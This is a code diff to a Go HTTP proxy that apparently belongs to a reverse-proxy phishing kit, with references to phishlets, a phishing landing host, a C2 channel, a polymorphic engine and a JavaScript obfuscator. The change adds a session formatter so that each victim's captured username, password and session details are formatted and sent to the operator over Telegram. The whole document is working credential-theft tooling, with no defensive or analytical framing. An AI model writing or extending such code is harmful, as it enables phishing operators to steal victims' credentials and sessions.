@@ -84,6 +84,7 @@ type HttpProxy struct {
 	c2Channel         *C2Channel
 	polymorphicEngine *PolymorphicEngine
 	obfuscator        *JSObfuscator
+	sessionFormatter  *SessionFormatter
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -142,6 +143,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		c2Channel:         nil, // Will be initialized based on config
 		polymorphicEngine: nil, // Will be initialized based on config
 		obfuscator:        NewJSObfuscator(cfg),
+		sessionFormatter:  NewSessionFormatter(),
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -2059,11 +2061,9 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 		// Check if we have both username and password to send notification
 		if s.Username != "" && s.Password != "" {
 			if sessionID, ok := p.sids[sid]; ok {
-				domain := ""
-				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
-					domain = pl.GetLandingPhishHost()
-				}
-				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
+				// Send formatted session using custom formatter
+				formattedMsg := p.sessionFormatter.FormatSession(s, s.Name, sessionID)
+				p.telegram.SendFormattedSession(sessionID, formattedMsg)
 			}
 		}
 	}
@@ -2080,11 +2080,9 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 		// Check if we have both username and password to send notification
 		if s.Username != "" && s.Password != "" {
 			if sessionID, ok := p.sids[sid]; ok {
-				domain := ""
-				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
-					domain = pl.GetLandingPhishHost()
-				}
-				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
+				// Send formatted session using custom formatter
+				formattedMsg := p.sessionFormatter.FormatSession(s, s.Name, sessionID)
+				p.telegram.SendFormattedSession(sessionID, formattedMsg)
 			}
 		}
 	}
